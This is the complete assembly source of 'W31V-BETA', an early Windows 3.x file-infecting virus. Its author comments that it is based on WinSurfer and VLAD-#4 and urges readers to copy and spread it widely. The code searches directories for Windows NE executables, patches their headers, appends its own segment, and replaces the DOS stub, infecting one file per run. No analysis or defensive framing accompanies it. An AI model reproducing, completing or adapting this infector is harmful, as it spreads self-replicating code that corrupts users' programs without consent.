;Virus Name: W31V-BETA
;Type      : Windows Virus, infects windows executables
;Written by: Stalker X
;
;
;Here it is folks my first windows virus.
;I would firstly just want to say thankyou to qark and quantum for this
;virus is based on the infection of a windows virus as discribed in VLAD-#4
;Ok as you can see parts of this virus is based on WinSurfer, BUT as you
;can also see it's more compact. Instead of using dropper code I used a
;software fuse. This virus also does not go TSR in windows, it infects on
;execute. The reason why I did not make it TSR is because it's to mutch work
;for me :) and secondly well at the rate Windows users restart programs there
;is no need to go TSR!
;This is my first try so bare with me :) ooooh yes all that comments is
;not ment for you the reader ... BUT ME!! :) Frankly I get lost in my own
;code if I don't comment it.
;Ok Assemble this virus as a EXE then run it in the dir of a Win EXE
;This virus only infects one file at a time but it does change dir's to
;find a file. Nothing new exept that it's for windows .. if you don't
;understand what I have written ,,,, then get VLAD-#4
;
;Please do copy this code .. add your own stuff if you want to .. I didn't
;write this so it can sit on a shelf. SO GO WILD.. just don't say you wrote
;the whole thing yourself.... just spread it as far as you can and in
;many diffrent copies as you can.

 jumps
.model tiny
.stack 512
.code
.286P
 assume cs:@code,ds:@code
 org 0

START:		pusha				;save all general regs
		push	si			;save si
		push	di			;save di
		push	ds			;save ds
		push	es			;save es
		
FUSE:		jmp	Fused			;first time no DPMI
		jmp	DPMIdetect		;goto dpmi code
Fused:		mov	ax,cs			;ax=cs
		mov	ds,ax			;ds=ax
		mov	word ptr cs:[FUSE],9090h;blow fuse after 1st run
		jmp	DPMIFin			;skip dpmi code
DPMIdetect:	mov	ax,1686h		;check for dpmi
		int	2fh			;do check
		or	ax,ax			;check return
		jz	DPMIfound		;if 0 then dpmi
		jmp	EXIT			;exit if no dpmi
DPMIfound:	mov	ax,000ah		;get alias selector
		push	cs			;save cs
		pop	bx			;restore cs in bx
		int	31h			;do get alias
		push	ax			;save ax
		pop	ds			;restore ax ds
DPMIFin:	mov	ah,1ah			;set DTA
		mov	dx,offset DTA		;set DTA ofs
		int	21h			;do set DTA

FindFirst:	xor	cx,cx			;set f attrib
		mov	ah,4eh			;find first file
		mov	dx,offset FSPEC		;set fspec
		int	21h			;do find it
		jc	EXIT			;exit if no exe found

Check:		call	Chk4WinEXE		;check if it's a win exe
		cmp	[TMP],0			;check return byte
		jz	FindNext		;go to next exe if not win

		call	Infect			;infect the win EXE
		mov	ah,3eh			;close the exe file
		int	21h			;do it
		jmp	EXIT			;exit to infect only 1 file
FindNext:	mov	ah,4fh			;find next file
		int	21h			;do find it
		jnc	Check			;go check again for win
ChangeDIR:	mov	dx,offset DOTDOT	;'..'
		mov	ah,3bh			;change dir
		int	21h			;do change now
		jnc	FindFirst		;find first file in dir

EXIT:		pop	es			;restore es
		pop	ds			;restore ds
		pop	di			;restore di
		pop	si			;restore si
		popa				;restore all general regs
		db	0eah			;far Jmp
ret_ip:		dw	0			;exit program
ret_set		dw	0ffffh			;-

Chk4WinEXE:	mov	dx,offset F_Name	;set file name ofs
		mov	ax,3d02h		;open file for r/w
		int	21h			;do open file
		jc	ChkExit			;exit on error
		mov	bx,ax			;save handle in bx

		mov	si,offset BUFF		;si=offset of buffer
		mov	ah,3fh			;read function
		mov	dx,offset BUFF		;dx=offset of buffer
		mov	cx,512			;read 512 bytes
		int	21h			;do read bytes

		cmp	byte ptr [si+18h],40h	;check relocation
		jb	ChkFinF			;exit if not ok
		cmp	word ptr [si+3ch],400h	;check NE offset
		jne	ChkFinF			;exit if not ok
		cmp	word ptr [si+16h],0	;CS must be 0
		jne	ChkFinF			;exit if not ok
		cmp	word ptr [si+14h],0	;IP must be 0
		jne	ChkFinF			;exit if not ok
		cmp	word ptr [si+08h],20h	;check header size
		je	ChkFin			;exit if not ok

ChkFinF:	mov	ah,3eh			;close file
		int	21h			;do close file
		mov	[TMP],0			;return error
		retn				;retn
ChkFin:		mov	[TMP],1			;return ok
ChkExit:	retn				;do it


Infect:		mov	si,offset BUFF		;si=offset buffer
		sub	word ptr [si+10h],8	;move SP back 8 bytes
		sub	word ptr [si+3ch],8	;move NE back 8 bytes

		mov	ax,4200h		;move r/w pointer
		xor	cx,cx			;cx=0
		xor	dx,dx			;dx=0
		int	21h			;do move r/w pointer

		mov	ah,40h			;write to file
		mov	dx,offset BUFF		;set source offset
		mov	cx,3eh			;write EXE header back
		int	21h			;do write header back

		mov	ax,4200h		;move r/w pointer
		xor	cx,cx			;cx=0
		mov	dx,200h			;set to dest
		int	21h			;do move r/w pointer
		mov	ah,40h			;write to file
		mov	dx,offset winstart	;dx=source offset
		mov	cx,offset windowsmsgend-offset winstart
		int	21h			;write new dos stub

		mov	ax,4200h		;move r/w pointer
		xor	cx,cx			;cx=0
		mov	dx,400h			;set offset
		int	21h			;do move r/w pointer
		mov	ah,3fh			;read from file
		mov	dx,offset BUFF		;dx=offset of buffer
		mov	cx,512			;read header
		int	21h			;do read from file

		inc	word ptr [si+1ch]	;inc segment count
		mov	ax,word ptr [si+1ch]	;ax=segment count
		dec	ax			;ax=ax-1
		mov	cl,8			;Assume Segs<255
		mul	cl			;multiply to get bytes
		xor	dx,dx			;dx=0
		add	ax,word ptr [si+22h]	;ax=total tab size
		adc	dx,0			;add with carry(just incase)
		mov	cx,512			;dx:ax/512
		div	cx			;do it
		mov	[Move512],ax		;Number of 512pages to mov
		mov	[MoveLft],dx		;Number of leftover bytes

		push	word ptr [si+32h]	;save file alignment value
		pop	[Al_Sh]			;save alignment shift value
		mov	[Seek],400h		;setup seek var

		push	word ptr [si+16h]	;save host cs
		pop	[hostcs]		;save NE cs
		push	word ptr [si+14h]	;save host ip
		pop	[hostip]		;save NE ip
		mov	ax,word ptr [si+1ch]	;ax=number of segments
		mov	word ptr [si+08h],0	;clr crc
		mov	word ptr [si+0ah],0	;clr crc
		mov	word ptr [si+14h],0	;set new ip
		mov	word ptr [si+16h],ax	;set new cs

		mov	ax,word ptr [si+22h]	;
		cmp	word ptr [si+04h],ax	;	
		jb	CmpRes			;
		add	word ptr [si+04h],8	;
CmpRes:		cmp	word ptr [si+24h],ax	;
		jb	CmpResi			;
		add	word ptr [si+24h],8	;
CmpResi:	cmp	word ptr [si+26h],ax	;
		jb	CmpModule		;
		add	word ptr [si+26h],8	;
CmpModule:	cmp	word ptr [si+28h],ax	;
		jb	CmpImp			;
		add	word ptr [si+28h],8	;
CmpImp:		cmp	word ptr [si+2ah],ax	;
		jb	MoveHead		;
		add	word ptr [si+2ah],8	;

MoveHead:	mov	ax,[Move512]		;loop to move NE head
		or	ax,ax			;check if counter=0
		jz	Last			;exit if counter=0

		dec	[Move512]		;counter=counter-1

		mov	ax,4200h		;move r/w pointer
		xor	cx,cx			;cx=0
		mov	dx,[Seek]		;dx=seek
		sub	dx,8			;dx=dx-8
		int	21h			;do move r/w pointer

		mov	ah,40h			;write to file
		mov	dx,offset BUFF		;dx=source offset
		mov	cx,512			;write 512 bytes
		int	21h			;do write 512 bytes

		add	[Seek],512		;seek=seek+512

		mov	ax,4200h		;move r/w pointer
		xor	cx,cx			;cx=0
		mov	dx,[Seek]		;dx=seek
		int	21h			;do move r/w pointer

		mov	ah,3fh			;read file
		mov	dx,offset BUFF		;dx=offset buffer
		mov	cx,512			;read 512 bytes
		int	21h			;do read 512 bytes

		jmp	MoveHead		;continue to move header

Last:		mov	ax,4202h		;seek end of file
		xor	cx,cx			;cx=0
		xor	dx,dx			;dx=0
		int	21h			;do seek
		mov	cl,byte ptr [Al_Sh]	;cl=shift count
		push	bx			;save bx
		mov	bx,1			;bx=1
		shl	bx,cl			;calc shift
		mov	cx,bx			;cx=bx
		pop	bx			;restore bx
		div	cx			;divide with shift

		mov	di,offset BUFF		;di=buffer offset
		add	di,[MoveLft]		;calc where to patch
		
		mov	word ptr [di],ax	;patch insert segment tab
		mov	word ptr [di+2],offset ALL_VIR
		mov	word ptr [di+4],180h
		mov	word ptr [di+6],offset ALL_VIR

		mov	ax,4200h		;move r/w pointer
		xor	cx,cx			;cx=0
		mov	dx,[Seek]		;dx=seek
		sub	dx,8			;dx=dx-8
		int	21h			;do move r/w pointer

		mov	ah,40h			;write to file
		mov	dx,offset BUFF		;dx=source offset
		mov	cx,[MoveLft]		;write bytes left
		add	cx,8			;cx=cx+8 (+segment entry)
		int	21h			;do write to file

		mov	ax,4202h		;seek end of file
		xor	cx,cx			;cx=0
		xor	dx,dx			;dx=0
		int	21h			;do seek
	
		mov	ax,word ptr ds:[ret_ip] ;save link
		mov	word ptr [si],ax	;save link
		mov	ax,[ret_set]		;save link
		mov	word ptr [si+2],ax	;save link

		mov	word ptr ds:[ret_ip],0	;setup relocation
		mov	[ret_set],0FFFFh	;!
		mov	[relocation],1		;!
		mov	[reloc2],3		;!
		mov	[reloc3],4		;!
		mov	[reloc4],offset ret_ip	;!

		mov	ah,40h			;write to file
		xor	dx,dx			;dx=0
		mov	cx,offset ALL_CODE	;write the hole body
		int	21h			;do write

		mov	ax,word ptr [si]	;restore link
		mov	word ptr ds:[ret_ip],ax	;restore link
		mov	ax,word ptr [si+2]	;restore link
		mov	[ret_set],ax		;restore link

		retn				;return from infection

;-Fake win msg
winstart:       call    windowsmsg
        	db      'This program requires Microsoft '
		db	'Windows.',0dh,0ah,'$'
windowsmsg:     pop     dx
	        push    cs
	        pop     ds
	        mov     ah,9
	        int     21h
	        mov     ax,4c01h
	        int     21h
windowsmsgend:

TMP	dw	0
Move512	dw	0
MoveLft	dw	0
Al_Sh	dw	0
Seek	dw	0
DOTDOT	db	'..',0
FSPEC	db	'*.exe',0
DTA	db	21 dup(0)
Attrib	db	0
F_Time	dw	0
F_Date	dw	0
F_SizeL	dw	0
F_SizeH	dw	0
F_Name	db	13 dup(0)
IDB	db	'w31v-BETA'
BUFF	db	512 dup(0)
ALL_VIR:
relocation	dw 1
reloc2		db 3
reloc3		db 4
reloc4		dw offset ret_ip
hostcs		dw 0
hostip		dw 0
ALL_CODE:
end START
